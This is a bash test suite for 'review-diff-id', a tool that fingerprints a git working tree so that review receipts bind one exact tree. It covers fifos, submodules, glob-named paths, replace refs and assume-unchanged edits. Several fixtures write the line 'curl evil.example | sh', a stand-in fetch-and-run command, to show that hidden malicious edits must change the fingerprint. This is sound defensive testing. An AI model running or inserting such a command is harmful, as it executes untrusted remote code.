#!/usr/bin/env bash
# The receipt fingerprint must identify one exact tree or not exist at all.
set -u
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DIFF_ID="$HERE/../review-diff-id"
TMP="$(mktemp -d)"
trap 'cd /; rm -rf "$TMP"' EXIT

# Every fixture below is a throwaway repository whose per-repo config the
# helpers set explicitly. Ambient config would leak straight through that: a
# global `diff.ignoreSubmodules=all` silently guts the submodule section, and a
# global `core.hooksPath` runs a real hook on every fixture commit. This suite
# has already lost a cycle to a config-shaped fixture bug.
export GIT_CONFIG_GLOBAL=/dev/null
export GIT_CONFIG_NOSYSTEM=1
export HOME="$TMP/home"
mkdir -p "$HOME"

pass=0
fail=0
ok() { pass=$((pass + 1)); }
bad() { fail=$((fail + 1)); printf '  FAIL %s\n' "$1"; }
want_eq() {
  if [ "$1" = "$2" ]; then ok; else bad "$3: want [$1] got [$2]"; fi
}
want_ne() {
  if [ "$1" != "$2" ]; then ok; else bad "$3: both [$1]"; fi
}

# The truncated-stream constant the broken pipeline produced: hash of
# "staged\0" plus an empty staged diff plus "\0unstaged\0", the exact prefix
# written before `git diff` aborted on a non-regular tracked path. No tree may
# ever fingerprint to it again.
TRUNCATED=3da51fa8685e0211d53e8492018a89ad92bb3639

# A repository whose tracked .env.example has been replaced by a fifo. The
# Claude Code sandbox creates this shape routinely by bind mounting /dev/null
# over deny-listed paths, which turns a tracked file into a character device.
mkrepo() {
  mkdir -p "$1"
  cd "$1" || exit 1
  git init -q
  git config user.email test@example.com
  git config user.name test
  git config commit.gpgsign false
  printf 'seed\n' > .env.example
  printf 'base\n' > service.txt
  git add .env.example service.txt
  git commit -qm init
}
nonregular() { rm -f "$1"; mkfifo "$1"; }

# A faithful transcription of the algorithm as it shipped, recomputed here from
# plain git commands. Every receipt already written in the field carries an id
# produced this way, so the value must not move for a tree with no non-regular
# paths. Recomputing beats a hardcoded hash: it stays correct across git
# versions, whose diff output the id depends on.
legacy_id() {
  {
    printf 'staged\0'
    git diff --cached --binary --no-ext-diff
    printf '\0unstaged\0'
    git diff --binary --no-ext-diff
    printf '\0untracked\0'
    while IFS= read -r -d '' p; do
      printf '%s\0' "$p"
      if [ -L "$p" ]; then
        printf 'symlink\0'
        readlink -- "$p" 2>/dev/null || printf 'unreadable-link'
        printf '\0'
      elif [ -f "$p" ] && [ -r "$p" ]; then
        git hash-object -- "$p"
      else
        printf 'nonregular\0'
        stat -c '%F|%s|%t|%T|%y|%i' -- "$p" 2>/dev/null \
          || stat -f '%HT|%z|%Hr|%Lr|%Fm|%i' -- "$p" 2>/dev/null \
          || printf 'unstatable'
        printf '\0'
      fi
    done < <(git ls-files -z --others --exclude-standard | LC_ALL=C sort -z)
  } | git hash-object --stdin
}

echo "== fingerprint must not collide across trees =="
mkrepo "$TMP/one"
nonregular .env.example
printf 'content A\n' > service.txt
id_a="$("$DIFF_ID" 2>/dev/null)"
rc_a=$?
printf 'func billing() { var mu sync.Mutex }\n' > service.txt
id_b="$("$DIFF_ID" 2>/dev/null)"
rc_b=$?
want_ne "$id_a" "$id_b" "two different trees with a tracked fifo must differ"
want_ne "$TRUNCATED" "$id_a" "tree A must not fingerprint to the truncated constant"
want_ne "$TRUNCATED" "$id_b" "tree B must not fingerprint to the truncated constant"
want_eq 0 "$rc_a" "an excludable non-regular path must still fingerprint (A)"
want_eq 0 "$rc_b" "an excludable non-regular path must still fingerprint (B)"

# Unrelated repositories must not share an id either. The broken version made
# the fingerprint a constant, so an approve receipt from any repository matched
# any other repository in the same state.
mkrepo "$TMP/two"
nonregular .env.example
printf 'entirely unrelated project\n' > service.txt
printf 'untracked note\n' > notes.txt
id_other="$("$DIFF_ID" 2>/dev/null)"
want_ne "$id_a" "$id_other" "unrelated repos with a tracked fifo must not share an id"
want_ne "$TRUNCATED" "$id_other" "unrelated repo must not fingerprint to the constant"

echo "== fingerprint stability and coverage with a non-regular path =="
cd "$TMP/one" || exit 1
want_eq "$id_b" "$("$DIFF_ID" 2>/dev/null)" "repeated calls on one tree must agree"
# `:(top,exclude)` pathspecs resolve against the repository root while plain
# `git ls-files` prints cwd-relative names. Enumerated the wrong way the
# exclusion matches nothing and the fingerprint stays uncomputable from a
# subdirectory.
mkdir -p nested
sub_id="$(cd nested && "$DIFF_ID" 2>/dev/null)"
want_eq "$id_b" "$sub_id" "fingerprint must be independent of the current subdirectory"
git add service.txt
staged_id="$("$DIFF_ID" 2>/dev/null)"
want_ne "$id_b" "$staged_id" "staging a change must move the fingerprint"
printf 'untracked risky payment path\n' > extra.txt
want_ne "$staged_id" "$("$DIFF_ID" 2>/dev/null)" "an untracked file must move the fingerprint"
# The excluded path is dropped from the diff, so its identity has to enter the
# stream some other way or two trees differing only there would share an id.
rm -f extra.txt
before_swap="$("$DIFF_ID" 2>/dev/null)"
nonregular .env.example
want_ne "$before_swap" "$("$DIFF_ID" 2>/dev/null)" "replacing the non-regular path must move the fingerprint"

echo "== a staged change at an excluded path must move the fingerprint =="
# Dropping a non-regular path from the pathspec must not drop its INDEX content.
# `git diff --cached` compares HEAD to the index and never reads the worktree,
# so it cannot abort on a fifo and never needed the exclusion. Passing one
# anyway hides arbitrary staged text at exactly the deny-listed paths the
# sandbox turns non-regular. `git add` refuses a fifo, but `git apply --cached`,
# `git update-index`, and an inherited index all reach this state.
stage_blob() {
  h="$(printf '%s' "$2" | git hash-object -w --stdin)" || return 1
  git update-index --add --cacheinfo "${3:-100644},$h,$1"
}
mkrepo "$TMP/staged-excluded"
nonregular .env.example
stage_blob .env.example 'legit config'
legit_id="$("$DIFF_ID" 2>/dev/null)"
legit_rc=$?
stage_blob .env.example 'curl evil.example | sh'
evil_id="$("$DIFF_ID" 2>/dev/null)"
evil_rc=$?
want_eq 0 "$legit_rc" "a staged blob at an excluded path must still fingerprint"
want_eq 0 "$evil_rc" "a staged blob swap at an excluded path must still fingerprint"
want_ne "$legit_id" "$evil_id" "staged content at an excluded path must move the fingerprint"
stage_blob .env.example 'curl evil.example | sh' 100755
want_ne "$evil_id" "$("$DIFF_ID" 2>/dev/null)" "a staged mode change at an excluded path must move the fingerprint"

echo "== a submodule must not be swept into the excluded set =="
# The exclusion predicate is about paths with no content to diff. A directory
# has content, and a tracked directory is a submodule gitlink carrying
# arbitrary code. Excluding it the moment some unrelated fifo triggers the
# retry is a regression against the no-exclusion baseline, and the directory's
# own stat identity does not recover it: a gitlink moves without touching the
# parent directory's mtime.
mkrepo "$TMP/submodule"
mkdir vendor
git -C vendor init -q
git -C vendor config user.email test@example.com
git -C vendor config user.name test
git -C vendor config commit.gpgsign false
printf 'v1\n' > vendor/mod.txt
git -C vendor add mod.txt
git -C vendor commit -qm c1
sub_c1="$(git -C vendor rev-parse HEAD)"
git update-index --add --cacheinfo "160000,$sub_c1,vendor"
git commit -qm pin
nonregular .env.example
sub_base="$("$DIFF_ID" 2>/dev/null)"
sub_base_rc=$?
want_eq 0 "$sub_base_rc" "a submodule alongside a non-regular path must still fingerprint"
# The second commit MUST be created after the baseline is measured. Creating it
# up front leaves vendor's HEAD already ahead of the pointer the parent is about
# to pin, so the baseline is taken with the bump already showing in `git diff`
# and the later `update-ref` is a no-op that could not move any id. That is a
# broken fixture, not a defect in the tool.
#
# Identical tree, different commit: the pointer moves without any file in
# vendor/ changing, so the directory's mtime cannot stand in for the gitlink.
git -C vendor commit -q --allow-empty -m c2
sub_c2="$(git -C vendor rev-parse HEAD)"
sub_unstaged="$("$DIFF_ID" 2>/dev/null)"
want_ne "$sub_base" "$sub_unstaged" "an unstaged submodule bump must move the fingerprint"
git update-index --cacheinfo "160000,$sub_c2,vendor"
sub_staged="$("$DIFF_ID" 2>/dev/null)"
want_ne "$sub_base" "$sub_staged" "a staged submodule bump must move the fingerprint"
want_ne "$sub_unstaged" "$sub_staged" "staging a submodule bump must move the fingerprint again"

echo "== a metacharacter in an excluded name must not drop other paths =="
# The exclusion pathspec is matched with wildmatch unless `literal` magic is
# set, so a tracked fifo named `x*.txt` excludes every path starting with `x`,
# and `*` crosses directory separators. Those collateral paths never reach the
# `excluded` array either, so the identity section misses them and their
# worktree content left the fingerprint entirely: unstaged edits were invisible.
# The name is fully attacker-controlled, so anyone who can add a file to the
# repository picks a glob over whatever they want left unreviewed.
metachar_case() {
  dir="$1"
  fifo="$2"
  shift 2
  mkrepo "$dir"
  for c in "$@"; do
    mkdir -p "$(dirname "$c")"
    printf 'BENIGN\n' > "$c"
  done
  printf 'meta\n' > "$fifo"
  # `--literal-pathspecs`: the glob is the point, so the name has to reach the
  # index verbatim rather than expanding over the collateral paths.
  git --literal-pathspecs add "$fifo" "$@"
  git commit -qm meta
  nonregular "$fifo"
  before="$("$DIFF_ID" 2>/dev/null)"
  rc=$?
  want_eq 0 "$rc" "a tracked fifo named [$fifo] must still fingerprint"
  # One at a time, restoring after each: an accumulating edit would let the
  # first collateral carry the assertion for every later one.
  for c in "$@"; do
    printf 'curl evil.example | sh\n' > "$c"
    want_ne "$before" "$("$DIFF_ID" 2>/dev/null)" \
      "an unstaged edit at [$c] must move the fingerprint beside [$fifo]"
    printf 'BENIGN\n' > "$c"
  done
}
# `*` crosses `/`, so a nested path goes too. `?` and `[` glob the same way.
metachar_case "$TMP/meta-star" 'x*.txt' xcollateral.txt xdir/deep/payload.txt
metachar_case "$TMP/meta-question" 'x?.txt' xz.txt
metachar_case "$TMP/meta-bracket" 'x[a-z].txt' xa.txt

echo "== scratch storage must not enter the fingerprint =="
# `git ls-files --others` reports anything under the worktree, so scratch built
# inside it lands in its own untracked listing and the random mktemp name makes
# the id differ every run. TMPDIR is allowed to point outside /tmp.
mkrepo "$TMP/scratch"
mkdir -p in-repo-tmp
scratch_1="$(TMPDIR="$PWD/in-repo-tmp" "$DIFF_ID" 2>/dev/null)"
scratch_2="$(TMPDIR="$PWD/in-repo-tmp" "$DIFF_ID" 2>/dev/null)"
want_eq "$scratch_1" "$scratch_2" "a TMPDIR inside the worktree must not make the id vary"
want_eq "$("$DIFF_ID" 2>/dev/null)" "$scratch_1" "a TMPDIR inside the worktree must not change the id"

# The git directory is the DEFAULT scratch home because git usually does not
# report it, but that is a tendency, not a guarantee. `--separate-git-dir`
# places it inside the worktree under a name other than `.git`, where
# `git ls-files --others` lists it like any other untracked directory, so an
# unexcluded scratch there made the id vary on every run for a tree the legacy
# algorithm fingerprints stably.
mkdir -p "$TMP/separate-gitdir"
cd "$TMP/separate-gitdir" || exit 1
git init -q --separate-git-dir="$PWD/mygit" .
git config user.email test@example.com
git config user.name test
git config commit.gpgsign false
printf 'base\n' > service.txt
git add service.txt
git commit -qm init
printf 'worktree edit\n' > service.txt
sep_1="$("$DIFF_ID" 2>/dev/null)"
sep_rc=$?
sep_2="$("$DIFF_ID" 2>/dev/null)"
want_eq 0 "$sep_rc" "a git directory inside the worktree must still fingerprint"
want_eq "$sep_1" "$sep_2" "a git directory inside the worktree must not make the id vary"
want_eq "$(legacy_id)" "$sep_1" "a git directory inside the worktree must not move the id"

# A read-only git directory computed fine under the legacy algorithm, which
# needed no scratch at all, so refusing to fingerprint here is a regression. The
# archived or read-only-mounted checkout is the shape that reaches this.
mkrepo "$TMP/readonly-gitdir"
printf 'worktree edit\n' > service.txt
ro_legacy="$(legacy_id)"
chmod -R a-w .git
ro_id="$("$DIFF_ID" 2>/dev/null)"
ro_rc=$?
chmod -R u+w .git
want_eq 0 "$ro_rc" "a read-only git directory must still fingerprint"
want_eq "$ro_legacy" "$ro_id" "a read-only git directory must not move the id"

echo "== concurrent runs and linked worktrees must be stable =="
# The receipt is written from one process and checked from another, so two runs
# racing on scratch must neither collide nor perturb each other's stream.
mkrepo "$TMP/concurrent"
printf 'worktree edit\n' > service.txt
for i in 1 2 3 4 5 6 7 8 9 10 11 12; do
  ( "$DIFF_ID" > "$TMP/conc-$i.id" 2>/dev/null; echo $? > "$TMP/conc-$i.rc" ) &
done
wait
conc_ids="$(cat "$TMP"/conc-*.id | LC_ALL=C sort -u | wc -l | tr -d ' ')"
conc_bad="$(cat "$TMP"/conc-*.rc | grep -cv '^0$' || true)"
want_eq 1 "$conc_ids" "12 concurrent runs must agree on exactly one id"
want_eq 0 "$conc_bad" "12 concurrent runs must all succeed"
want_eq "$(legacy_id)" "$(cat "$TMP/conc-1.id")" "a concurrent run must not move the id"

# A linked worktree resolves its git directory to .git/worktrees/<name>, which
# lives inside the MAIN worktree and outside this one, so the scratch is
# unreported here.
mkrepo "$TMP/linked-main"
git worktree add -q "$TMP/linked-wt" -b linked
cd "$TMP/linked-wt" || exit 1
printf 'worktree edit\n' > service.txt
lw_1="$("$DIFF_ID" 2>/dev/null)"
lw_rc=$?
lw_2="$("$DIFF_ID" 2>/dev/null)"
want_eq 0 "$lw_rc" "a linked worktree must fingerprint"
want_eq "$lw_1" "$lw_2" "a linked worktree id must be stable"
want_eq "$(legacy_id)" "$lw_1" "a linked worktree must not move the id"

echo "== compatibility oracle: byte-identical id for an ordinary tree =="
mkrepo "$TMP/plain"
want_eq "$(legacy_id)" "$("$DIFF_ID" 2>/dev/null)" "clean tree id must be unchanged"
printf 'worktree edit\n' > service.txt
want_eq "$(legacy_id)" "$("$DIFF_ID" 2>/dev/null)" "unstaged tree id must be unchanged"
git add service.txt
printf 'and more\n' >> service.txt
printf 'untracked\n' > extra.txt
mkdir -p sub && printf 'deeper\n' > sub/deep.txt
ln -sfn service.txt link.txt
ln -sfn nowhere.txt dangling.txt
printf 'binary\000payload\n' > blob.bin
want_eq "$(legacy_id)" "$("$DIFF_ID" 2>/dev/null)" "mixed staged, unstaged, untracked, symlink, binary id must be unchanged"

# A filename may legally END IN A NEWLINE. It must bind separately from the same
# name without one, or one file's bytes stand in for another's and a receipt
# covers content nobody was shown. This side reads NUL-delimited already; the
# assertion pins that, and pins it against the legacy algorithm so the fix on the
# launcher side cannot be paid for with an id change here.
printf 'func billingOne() {}\n' > late.go
nl_one="$("$DIFF_ID" 2>/dev/null)"
printf 'func billingTwo() {}\n' > $'late.go\n'
nl_two="$("$DIFF_ID" 2>/dev/null)"
want_ne "$nl_one" "$nl_two" "an untracked name ending in a newline must move the id"
want_eq "$(legacy_id)" "$nl_two" "a newline-terminated untracked name must not move the id off the legacy algorithm"
printf 'func billingThree() {}\n' > $'late.go\n'
want_ne "$nl_two" "$("$DIFF_ID" 2>/dev/null)" "editing a newline-terminated untracked file must move the id"

echo "== an uncomputable fingerprint must not be reported as a value =="
if [ "$(id -u)" = 0 ]; then
  echo "  skip: running as root, mode 000 stays readable"
else
  mkrepo "$TMP/unreadable"
  # A tracked REGULAR file git cannot read. Unlike a fifo this cannot be
  # excluded: a regular file can carry logic, so dropping it would hand back an
  # id for a tree the tool never read.
  printf 'secret\n' > service.txt
  chmod 000 service.txt
  out="$("$DIFF_ID" 2>/dev/null)"
  rc=$?
  want_ne 0 "$rc" "an unreadable tracked file must fail with a non-zero status"
  want_eq "" "$out" "a failed fingerprint must print nothing on stdout"
  err="$("$DIFF_ID" 2>&1 >/dev/null)"
  case "$err" in
    *review-diff-id*) ok ;;
    *) bad "a failed fingerprint must explain itself on stderr: [$err]" ;;
  esac
  chmod 644 service.txt
fi

echo "== argument handling =="
out="$("$DIFF_ID" "$TMP" 2>/dev/null)"
want_eq 2 "$?" "a path outside any worktree must exit 2"
want_eq "" "$out" "a non-worktree must print nothing on stdout"

# A nonexistent argument used to die on bash's own `cd:` message with status 1,
# which is neither the documented status nor attributable to this tool.
out="$("$DIFF_ID" "$TMP/no-such-directory" 2>/dev/null)"
want_eq 2 "$?" "a nonexistent path must exit 2"
want_eq "" "$out" "a nonexistent path must print nothing on stdout"
err="$("$DIFF_ID" "$TMP/no-such-directory" 2>&1 >/dev/null)"
case "$err" in
  *review-diff-id*) ok ;;
  *) bad "a nonexistent path must name this tool on stderr: [$err]" ;;
esac

echo "== replacement objects do not move the fingerprint =="
# `git replace X Y` installs a ref that makes every object read return Y where X
# was asked for, and moves no ref: `git rev-parse HEAD` still prints X while
# `git diff HEAD` renders against Y. A receipt binds the HEAD ref OID, so without
# this the same OID can stand for two different trees.
mkrepo "$TMP/replaced"
printf 'second\n' > service.txt
git add service.txt
git commit -qm second
printf 'pending\n' > service.txt
rep_before="$("$DIFF_ID")"
git replace "$(git rev-parse HEAD)" "$(git rev-parse HEAD~1)"
want_eq "$rep_before" "$("$DIFF_ID")" "a replace ref must not move the id"
# The premise: with replacement honored the delta really would look different, so
# the assertion above is about the tool reading the real objects rather than about
# the replacement being inert.
want_ne "$(git diff HEAD)" "$(git --no-replace-objects diff HEAD)" \
  "test premise: the replacement changes what a replacement-aware read sees"
git replace -d "$(git rev-parse HEAD)" >/dev/null 2>&1
want_eq "$(legacy_id)" "$rep_before" "a repository with no replace ref keeps the legacy id"

echo "== the index must not hide a modification from the fingerprint =="
# `assume-unchanged` stops git stat'ing the worktree, so an edit lands in no diff
# and no status. An id computed over that names the tree as it was, which is the
# one thing this tool must never hand back.
mkrepo "$TMP/assume-unchanged"
au_clean="$("$DIFF_ID")"
git update-index --assume-unchanged service.txt
want_eq "$au_clean" "$("$DIFF_ID" 2>/dev/null)" "the bit over unchanged content must not break the id"
printf 'hidden rewrite\n' > service.txt
want_eq "" "$(git diff HEAD)" "test premise: the edit is invisible to git diff"
out="$("$DIFF_ID" 2>/dev/null)"
want_ne 0 "$?" "an edit hidden by assume-unchanged must fail rather than report the old id"
want_eq "" "$out" "a refused fingerprint must print nothing on stdout"
err="$("$DIFF_ID" 2>&1 >/dev/null)"
case "$err" in
  *service.txt*) ok ;;
  *) bad "the refusal must name the path: [$err]" ;;
esac
git update-index --no-assume-unchanged service.txt
want_ne "$au_clean" "$("$DIFF_ID")" "clearing the bit exposes a real change"

# skip-worktree is a DIFFERENT bit and sparse checkout sets it on every path
# outside the cone, so it must stay supported. `git ls-files -v` separates them:
# lowercase for assume-unchanged, uppercase 'S' for skip-worktree.
mkrepo "$TMP/skip-worktree"
git update-index --skip-worktree service.txt
sw_present="$("$DIFF_ID" 2>/dev/null)"
want_ne "" "$sw_present" "a skip-worktree path matching the index must still fingerprint"
git config core.sparseCheckout true
rm service.txt
want_ne "" "$("$DIFF_ID" 2>/dev/null)" "a sparse checkout that removed the path must still fingerprint"
git config --unset core.sparseCheckout
printf 'materialized and changed\n' > service.txt
want_eq "" "$(git diff HEAD)" "test premise: a materialized skip-worktree edit is invisible to git diff"
out="$("$DIFF_ID" 2>/dev/null)"
want_ne 0 "$?" "a materialized changed skip-worktree path must fail rather than report an id"
want_eq "" "$out" "a refused fingerprint must print nothing on stdout"

echo "== the supplemental submodule fingerprint =="
# A gitlink diffs as a bare `Subproject commit <sha>` line and its untracked
# content does not diff at all, so the subject id cannot see either. The
# supplemental fingerprint covers them, ALONGSIDE the id and never inside it.
mkrepo "$TMP/no-gitlink"
want_eq "" "$("$DIFF_ID" --submodules)" "a repository with no gitlink reports no submodule fingerprint"
want_eq 0 "$?" "and reports it with a success status, so empty does not read as failure"

subsrc="$TMP/sub-src"
mkdir -p "$subsrc"
(
  cd "$subsrc" || exit 1
  git init -q
  git config user.email test@example.com
  git config user.name test
  git config commit.gpgsign false
  printf 'clean\n' > lib.txt
  git add lib.txt
  git commit -qm one
  printf 'risky\n' > lib.txt
  git add lib.txt
  git commit -qm two
) >/dev/null 2>&1
sub_one="$(git -C "$subsrc" rev-parse HEAD~1)"
sub_two="$(git -C "$subsrc" rev-parse HEAD)"
mkrepo "$TMP/superproject"
# NO `diff.ignoreSubmodules` here. Under the DEFAULT configuration git omits an
# untracked-only dirty submodule from every diff, which is the weakest case and
# the one the supplemental fingerprint exists for. Setting the variable would
# make these cases pass against a stricter git than anyone actually runs.
git -c protocol.file.allow=always submodule add -q "$subsrc" vendor/lib >/dev/null 2>&1
git -C vendor/lib checkout -q "$sub_one"
git add -A
git commit -qm "add submodule"
sup_legacy="$(legacy_id)"
want_eq "$sup_legacy" "$("$DIFF_ID")" "a repository with a submodule keeps the legacy subject id"
sup_id_clean="$("$DIFF_ID")"
sup_sub_clean="$("$DIFF_ID" --submodules)"
want_ne "" "$sup_sub_clean" "a repository with a gitlink reports a submodule fingerprint"
want_eq "$sup_sub_clean" "$("$DIFF_ID" --submodules)" "the submodule fingerprint is stable across runs"

# Two different dirty contents render the same superproject diff, because `-dirty`
# is a flag rather than content. That collision is the whole reason the
# supplemental binding exists.
git -C vendor/lib checkout -q "$sub_two"
printf 'first dirty content\n' > vendor/lib/lib.txt
dirty_id_one="$("$DIFF_ID")"
dirty_sub_one="$("$DIFF_ID" --submodules)"
printf 'second dirty content\n' > vendor/lib/lib.txt
want_eq "$dirty_id_one" "$("$DIFF_ID")" "two dirty submodule contents share one subject id"
want_ne "$dirty_sub_one" "$("$DIFF_ID" --submodules)" "the submodule fingerprint separates them"
want_eq "$(legacy_id)" "$("$DIFF_ID")" "a dirty submodule keeps the subject id on the legacy algorithm"

# Untracked content inside the submodule contributes no superproject hunk at all.
git -C vendor/lib checkout -q -- lib.txt
git -C vendor/lib checkout -q "$sub_one"
want_eq "$sup_id_clean" "$("$DIFF_ID")" "the tree is back to its reviewed shape"
want_eq "$sup_sub_clean" "$("$DIFF_ID" --submodules)" "and so is its submodule fingerprint"
printf 'dropped in\n' > vendor/lib/dropped.txt
want_eq "" "$(git diff HEAD)" "test premise: an untracked file inside a submodule produces no superproject diff at all"
want_eq "$sup_id_clean" "$("$DIFF_ID")" "an untracked file inside a submodule does not move the subject id"
want_ne "$sup_sub_clean" "$("$DIFF_ID" --submodules)" "an untracked file inside a submodule moves the submodule fingerprint"
# The section is what the reviewer is shown and what the fingerprint hashes, so it
# must actually carry the content rather than another pointer.
# `tr -d '\0'`: the section NUL-frames its path headings so two trees cannot
# render byte-identical text, and command substitution drops NULs with a warning.
section="$("$DIFF_ID" --submodule-section | tr -d '\0')"
case "$section" in
  *"dropped in"*) ok ;;
  *) bad "the section must show untracked content inside the submodule" ;;
esac
rm vendor/lib/dropped.txt
want_eq "$sup_sub_clean" "$("$DIFF_ID" --submodules)" "removing it restores the fingerprint"

# `submodule.<name>.ignore = all` is a setting the REVIEWED repository ships, in
# its own .gitmodules, and it removes the submodule from every diff including the
# pointer bump. The supplemental fingerprint must not be something the repository
# under review gets to switch off.
git -C vendor/lib checkout -q "$sub_two"
ignored_sub="$("$DIFF_ID" --submodules)"
git config submodule.vendor/lib.ignore all
want_eq "" "$(git diff HEAD)" "test premise: 'ignore = all' hides the pointer bump from git diff"
want_ne "$sup_sub_clean" "$("$DIFF_ID" --submodules)" \
  "'ignore = all' must not hide a pointer bump from the submodule fingerprint"
want_eq "$ignored_sub" "$("$DIFF_ID" --submodules)" \
  "and the fingerprint is the same one the setting was supposed to suppress"
git config --unset submodule.vendor/lib.ignore
git -C vendor/lib checkout -q "$sub_one"

# An uninitialized submodule is an empty directory, and recording that state is a
# faithful binding: initializing it later moves the fingerprint.
git -C vendor/lib checkout -q "$sub_one"
uninit_before="$("$DIFF_ID" --submodules)"
mv vendor/lib "$TMP/parked-submodule"
mkdir vendor/lib
want_ne "$uninit_before" "$("$DIFF_ID" --submodules)" "an uninitialized submodule binds a different state"
want_ne "" "$("$DIFF_ID" --submodules)" "and still produces a fingerprint rather than failing"
# ...but git refuses to look inside a gitlink path at all, so anything dropped
# into that directory is reported by NO read: not the diff, not `ls-files
# --others`, not status. Calling it "no content to review" would be a lie the
# fingerprint then certifies.
uninit_empty="$("$DIFF_ID" --submodules)"
printf 'func chargeCard() { stripe(secret) }\n' > vendor/lib/dropped.go
want_eq "" "$(git ls-files --others --exclude-standard)$(git status --porcelain)" \
  "test premise: content inside an uninitialized submodule reaches no git read at all"
want_eq "$sup_id_clean" "$("$DIFF_ID")" "and does not move the subject id"
want_ne "$uninit_empty" "$("$DIFF_ID" --submodules)" \
  "content inside an uninitialized submodule must move the submodule fingerprint"
uninit_section="$("$DIFF_ID" --submodule-section | tr -d '\0')"
case "$uninit_section" in
  *"stripe(secret)"*) ok ;;
  *) bad "the section must show content inside an uninitialized submodule" ;;
esac
rm -f vendor/lib/dropped.go
want_eq "$uninit_empty" "$("$DIFF_ID" --submodules)" "removing it restores the fingerprint"
rmdir vendor/lib
mv "$TMP/parked-submodule" vendor/lib

echo "== argument handling, supplemental modes =="
out="$("$DIFF_ID" --no-such-mode 2>/dev/null)"
want_eq 2 "$?" "an unknown option must exit 2"
want_eq "" "$out" "an unknown option must print nothing on stdout"

printf '\n%s passed, %s failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
